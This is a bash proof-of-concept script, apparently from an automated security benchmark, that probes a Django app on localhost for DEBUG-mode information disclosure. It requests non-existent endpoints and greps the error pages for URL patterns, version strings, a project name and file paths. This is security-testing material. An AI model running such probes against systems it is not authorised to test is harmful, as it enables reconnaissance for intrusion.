#!/bin/bash
# POC: Demonstrates Django DEBUG mode information disclosure by accessing non-existent endpoints to enumerate URLs and framework information
# Target: ./repo
# Created: 2025-12-01T15:51:17.948Z
# Session: benchmark-XBEN-056-24-minbd206

# Django DEBUG Mode Information Disclosure POC
# This script demonstrates how DEBUG=True exposes sensitive information
# including URL patterns, framework versions, and file paths

TARGET_URL="${1:-http://localhost:8081}"

echo "[*] Django DEBUG Mode Information Disclosure POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Access non-existent /admin/ endpoint
echo "[*] Test 1: Accessing non-existent /admin/ endpoint..."
echo "[*] This should trigger a 404 error page with DEBUG information"
echo ""

RESPONSE=$(curl -s "$TARGET_URL/admin/")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/admin/")

echo "[+] HTTP Status Code: $HTTP_CODE"
echo ""

# Check for DEBUG indicators
if echo "$RESPONSE" | grep -q "DEBUG = True"; then
    echo "[✓] VULNERABLE: Found 'DEBUG = True' message in error page"
    echo ""
fi

# Extract and display URLconf information
if echo "$RESPONSE" | grep -q "Using the URLconf"; then
    echo "[✓] VULNERABLE: URLconf patterns exposed"
    echo ""
    echo "--- URL Patterns Disclosed ---"
    echo "$RESPONSE" | grep -A 50 "Using the URLconf" | grep -E "^[[:space:]]*/" | head -20 || true
    echo ""
fi

# Extract framework and version information
if echo "$RESPONSE" | grep -qi "django\|python"; then
    echo "[✓] VULNERABLE: Framework version information exposed"
    echo ""
    echo "--- Framework Information ---"
    # Look for server info and Python version
    if echo "$RESPONSE" | grep -qi "Server"; then
        echo "$RESPONSE" | grep -i "Server\|Python\|Django" | head -5
    fi
    echo ""
fi

# Test 2: Access another non-existent endpoint
echo "[*] Test 2: Accessing non-existent /accounts/ endpoint..."
RESPONSE2=$(curl -s "$TARGET_URL/accounts/")
HTTP_CODE2=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/accounts/")

echo "[+] HTTP Status Code: $HTTP_CODE2"

if [ "$HTTP_CODE2" = "404" ]; then
    echo "[✓] VULNERABLE: Non-existent endpoint returns 404 (not 302 or custom error)"
fi
echo ""

# Test 3: Check for project name disclosure
echo "[*] Test 3: Checking for project name disclosure..."
if echo "$RESPONSE" | grep -q "ssti_secret_art_gallery"; then
    echo "[✓] VULNERABLE: Project name 'ssti_secret_art_gallery' disclosed"
    echo ""
fi

# Test 4: Look for file paths
echo "[*] Test 4: Checking for file path exposure..."
if echo "$RESPONSE" | grep -qE "/[a-zA-Z0-9_/]+\.py"; then
    echo "[✓] VULNERABLE: File paths exposed in error traceback"
    PATHS=$(echo "$RESPONSE" | grep -oE "/[a-zA-Z0-9_/]+\.py" | head -5)
    echo "Sample exposed paths:"
    echo "$PATHS"
    echo ""
fi

# Summary
echo "========== VULNERABILITY SUMMARY =========="
if [ "$HTTP_CODE" = "404" ] && echo "$RESPONSE" | grep -q "DEBUG = True"; then
    echo "[!] DEBUG MODE IS ENABLED - Information Disclosure Vulnerability Confirmed"
    echo "[!] Severity: HIGH"
    echo "[!] The application exposes:"
    echo "    - URL patterns and routes"
    echo "    - Framework and version information"
    echo "    - Project structure"
    echo "    - File paths"
    echo "[!] Recommendation: Set DEBUG=False in production"
else
    echo "[-] Could not confirm DEBUG mode is enabled"
    echo "[-] Check if target is running or if DEBUG has been disabled"
fi
echo "=========================================="